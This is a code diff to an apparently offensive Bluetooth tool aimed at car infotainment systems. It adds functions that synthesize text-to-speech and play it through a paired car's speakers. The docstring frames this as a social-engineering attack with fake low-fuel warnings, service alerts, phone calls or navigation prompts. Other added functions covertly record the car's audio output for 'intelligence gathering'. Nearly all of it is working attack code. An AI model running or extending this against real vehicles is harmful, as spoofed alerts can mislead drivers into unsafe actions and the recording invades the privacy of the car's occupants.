@@ -269,6 +269,10 @@ def record_car_mic(mac: str, output_file: str = "car_mic.wav",
     info(f"Recording from {source} ({rate}Hz, {channels}ch) -> {output_file}")
     info(f"Duration: {duration}s (Ctrl+C to stop early)")
 
+    if not check_tool("parecord"):
+        error("parecord not found. Install: apt install pulseaudio-utils")
+        return ""
+
     # Use parecord (proven more reliable than pw-record for BT)
     cmd = [
         "parecord",
@@ -398,6 +402,7 @@ def play_to_car(mac: str, audio_file: str, volume_pct: int = 80) -> bool:
     result = subprocess.run(
         ["paplay", f"--device={sink}", audio_file],
         timeout=600,
+        capture_output=True,
     )
 
     if result.returncode == 0:
@@ -483,6 +488,102 @@ def stop_loopback() -> bool:
 # A2DP Capture (Media Stream from IVI)
 # ============================================================================
 
+def inject_tts(mac: str, text: str, lang: str = "en",
+               output_file: str = "/tmp/bt_tap_tts.wav") -> bool:
+    """Generate text-to-speech audio and play through car speakers.
+
+    Social engineering attack: inject convincing audio messages like
+    "Low fuel warning", "Service required", fake phone calls, or
+    navigation prompts through the car's speakers.
+
+    Requires: espeak-ng or pico2wave (apt install espeak-ng)
+
+    Args:
+        mac: Car/IVI Bluetooth MAC address
+        text: Text to synthesize and play
+        lang: Language code (en, de, fr, es, etc.)
+        output_file: Temp WAV file for synthesized audio
+    """
+    info(f"Generating TTS: '{text[:50]}...' -> car speakers")
+
+    # Try espeak-ng first (most common on Kali)
+    if check_tool("espeak-ng"):
+        result = run_cmd([
+            "espeak-ng", "-v", lang, "-w", output_file, text
+        ], timeout=30)
+        if result.returncode != 0:
+            error(f"espeak-ng failed: {result.stderr.strip()}")
+            return False
+    elif check_tool("pico2wave"):
+        result = run_cmd([
+            "pico2wave", f"--lang={lang}", f"--wave={output_file}", text
+        ], timeout=30)
+        if result.returncode != 0:
+            error(f"pico2wave failed: {result.stderr.strip()}")
+            return False
+    else:
+        error("No TTS engine found. Install: apt install espeak-ng")
+        return False
+
+    success(f"TTS generated: {output_file}")
+    return play_to_car(mac, output_file)
+
+
+def record_navigation_audio(mac: str, output_file: str = "nav_audio.wav",
+                             duration: int = 300) -> str:
+    """Record navigation/alert audio from the IVI.
+
+    Captures what the IVI is playing — navigation prompts, system alerts,
+    media audio. Useful for understanding the IVI's audio routing and
+    for intelligence gathering.
+
+    Args:
+        mac: Car/IVI Bluetooth MAC address
+        output_file: Output WAV file
+        duration: Recording duration (default 5 minutes)
+    """
+    info(f"Recording IVI audio output for {duration}s...")
+
+    # Use A2DP source (IVI -> us) not HFP mic
+    set_profile_a2dp(mac)
+    time.sleep(1)
+
+    source = bt_a2dp_source_name(mac)
+    unmute_source(source)
+
+    if not check_tool("parecord"):
+        error("parecord not found. Install: apt install pulseaudio-utils")
+        return ""
+
+    cmd = [
+        "parecord",
+        f"--device={source}",
+        "--rate=44100",
+        "--channels=2",
+        "--format=s16le",
+        "--file-format=wav",
+        output_file,
+    ]
+
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        info(f"Recording IVI audio (PID: {proc.pid})")
+        time.sleep(duration)
+        proc.terminate()
+        proc.wait(timeout=5)
+    except subprocess.TimeoutExpired:
+        proc.kill()
+    except Exception as e:
+        error(f"Recording failed: {e}")
+        return ""
+
+    if os.path.exists(output_file):
+        size = os.path.getsize(output_file)
+        success(f"Captured IVI audio: {output_file} ({size} bytes)")
+        return output_file
+    return ""
+
+
 def capture_a2dp(mac: str | None = None, output_file: str = "a2dp_capture.wav",
                   duration: int = 60, source: str | None = None) -> str:
     """Capture A2DP audio stream to WAV file.
@@ -490,6 +591,11 @@ def capture_a2dp(mac: str | None = None, output_file: str = "a2dp_capture.wav",
     If mac is provided, constructs the device name automatically.
     Otherwise falls back to auto-detection.
     """
+    # Ensure A2DP profile is active for media audio capture
+    if mac:
+        set_profile_a2dp(mac)
+        time.sleep(1)
+
     if source is None and mac:
         source = bt_a2dp_source_name(mac)
     elif source is None:
